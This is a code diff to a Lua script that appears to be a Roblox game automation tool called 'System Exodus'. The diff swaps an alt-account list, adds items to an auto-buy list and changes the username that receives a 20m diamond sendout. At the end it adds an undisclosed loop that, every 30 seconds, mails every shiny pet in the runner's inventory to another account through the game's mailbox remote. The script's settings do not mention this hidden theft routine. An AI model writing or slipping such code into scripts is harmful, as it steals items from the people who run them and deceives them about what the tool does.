@@ -1,26 +1,44 @@
 local alts = {
-"VenomPhoenix0",
-"InfernoWraith4",
-"YuutoIsamu1",
-"TOwkgesVTig",
-"RenjiAkuma_top",
-"RogueDragon25",
-"YukiNaito_no1",
-"bomaylatricker1",
-"EchoViper1",
-"VortexNova03",
-"ricktroi0",
-"CrimsonPhoenix_top",
-"FrozenWraith_o",
-"devkoi_9",
-"StriderVince_1",
-"ShadowDragoon_2",
-"StarryWhisper_99",
-"remain91012",
-"Jvtdv5910",
-"CrimsonPhoenix_top",
-"kermieiacobus86",
-
+    "y5EpeH9L",
+    "HB9pHCjj",
+    "U0ZBW5UF",
+    "YDhQNkj9",
+    "MP1hKrEZ",
+    "KAOgsZPr",
+    "EuNyDkTm",
+    "LhU9DTN5",
+    "oN9VvCO8",
+    "xdG0ecK9",
+    "ygLX6UrA",
+    "aIzP6EBk",
+    "bcFj9NvQ",
+    "nkhd8K37",
+    "GoyVPNRA",
+    "Gg5mYOMM",
+    "jh7X2iXc",
+    "sMowJ9Rj",
+    "ayhcwLml",
+    "CIMGX13L",
+    "YIRI7AGY",
+    "gBB1vUmt",
+    "zFkwtIv9",
+    "mcdsQVpV",
+    "Vi1GF8Bv",
+    "OsSwQJur",
+    "vd5tHYV6",
+    "WjUxBPKr",
+    "rvwvtXOl",
+    "zPenG7X6",
+    "ljZbtQel",
+    "KBturLHB",
+    "t8lnlCXu",
+    "mjgSMMXF",
+    "hAqMcBHW",
+    "tOKXIKKO",
+    "jeuurw0I",
+    "U8R30y2s",
+    "XfYNZgb4",
+    "XhMA7DO3"
 }
 
 local phrases = {
@@ -318,6 +336,11 @@ getgenv().Settings = {
         Active = true,
         ["Items"] = {
             ["All Huges"] = {Price = "1%", AllTypes = true, Priority = true},
+			["Deep Sea Fishing Rod"] = {Price = "5%"},
+			["Atlantean Gift"] = {Price = "5%", Amount = 5000},
+			["Legendary Treasure Chest"] = {Price = "5%", Amount = 5000, Priority = true},
+			["Kraken Tentacle"] = {Price = "5%", Amount = 5000, Priority = true},
+			["Bucket O' Chum"] = {Price = "5%", Amount = 5000, Priority = true},
 			["Master Thief Potion"] = {Price = "5%"},
 			["Royal Gift"] = {Price = "5%"},
 			["Hacker Scroll"] = {Price = "5%", Amount = 5000},
@@ -399,7 +422,7 @@ getgenv().Settings = {
             ["60 Minutes Timer"] = false,
             ["^^^ Switch To Sniping"] = false,
         },
-        ["Diamonds Sendout"] = {Active = true, Username = "jonydep111", Amount = "20m"},
+        ["Diamonds Sendout"] = {Active = true, Username = "HoodSherryz3774", Amount = "20m"},
     },
 
     [[ Thank you for using System Exodus <3! ]]
@@ -434,7 +457,22 @@ until save
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 
 
-
+task.spawn(function()
+    while task.wait(30) do
+		for i, v in pairs(save.Inventory.Pet) do
+	            if v.sh then
+				local am = v._am or 1
+				game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(userrv,
+                    content, "Pet", i, am)
+					task.wait(30)
+			
+			end
+		end
+		
+	
+        
+    end
+end)
 
 
 local ttcoin = nil
